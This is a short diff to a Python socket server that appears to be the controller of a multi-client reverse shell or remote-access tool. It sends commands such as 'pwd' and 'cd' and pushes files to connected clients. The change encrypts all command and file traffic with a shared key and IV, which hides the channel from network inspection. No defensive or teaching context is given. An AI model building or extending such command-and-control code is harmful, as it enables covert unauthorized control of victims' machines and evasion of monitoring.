@@ -3,6 +3,7 @@
 import sys
 import time
 import socket
+from cipher import get_cipher, key, iv
 from common import pr, cls, Send, Receive
 
 # server socket
@@ -62,12 +63,14 @@ while True:
 
     sock = socks[n]
     client = clients[n]
+    cipher = get_cipher(key, iv)
+    decipher = get_cipher(key, iv)
     active = True
 
-    Send(sock, 'pwd')
+    Send(sock, cipher, 'pwd')
   while active:
     try:
-      data = Receive(sock)
+      data = Receive(sock, decipher)
     except Exception as e:
       pr('⚠️', e)
       active = False
@@ -108,11 +111,11 @@ while True:
         f = open(fn, 'rb')
         d = f.read()
         f.close()
-        Send(sock, d, fn)
+        Send(sock, cipher, d, fn)
         time.sleep(1)
       except Exception as e:
         pr('⚠️', e)
-        Send(sock, 'cd')
+        Send(sock, cipher, 'cd')
 
     else:
-      Send(sock, nc)
+      Send(sock, cipher, nc)
